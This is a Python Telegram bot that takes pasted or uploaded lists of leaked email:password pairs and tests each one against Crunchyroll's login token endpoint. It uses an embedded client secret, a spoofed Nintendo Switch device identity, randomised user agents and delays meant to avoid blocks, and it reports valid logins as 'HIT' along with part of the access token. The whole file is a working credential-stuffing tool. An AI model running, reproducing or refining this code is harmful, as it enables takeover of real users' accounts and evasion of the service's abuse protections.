import os
import asyncio
import re
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes


def crunchyroll_check(email: str, password: str):
    try:
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            "Host": "beta-api.crunchyroll.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": generate_user_agent(),
            "Accept-Encoding": "gzip"
        }
        
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": "y2arvjb0h0rgvtizlovy",
            "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
            "device_type": "console",
            "device_id": str(uuid4()),
            "device_name": "Nintendo Switch"
        }

        r = requests.post(url, headers=headers, data=data, timeout=30)
        
        if r.status_code == 200 and "access_token" in r.text:
            token = r.json().get("access_token", "")
            return f"✅ **HIT** ✅\nEmail: `{email}`\nToken: `{token[:55]}...`"
        elif r.status_code in [400, 401]:
            return "❌ Invalid credentials"
        else:
            return f"❌ Failed ({r.status_code})"

    except Exception as e:
        return "⚠️ Error"


def extract_combos(text):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    matches = re.findall(pattern, text)
    return [f"{e.strip()}:{p.strip()}" for e, p in matches if e and p]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **Improved Crunchyroll Checker**\n\n"
        "Paste messy text or upload .txt file"
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    if text.startswith('/'):
        return

    combos = extract_combos(text)
    if not combos:
        return await update.message.reply_text("❌ No combos found")

    await update.message.reply_text(f"✅ Found {len(combos)} accounts. Checking...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
        
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        
        await asyncio.sleep(2.5)   # Increased delay to avoid blocks


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        return await update.message.reply_text("Only .txt allowed")

    await update.message.reply_text("Processing file...")
    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
    
    combos = extract_combos(content)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2.5)


def main():
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("Token not set!")
        return

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    print("🚀 Improved Bot Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
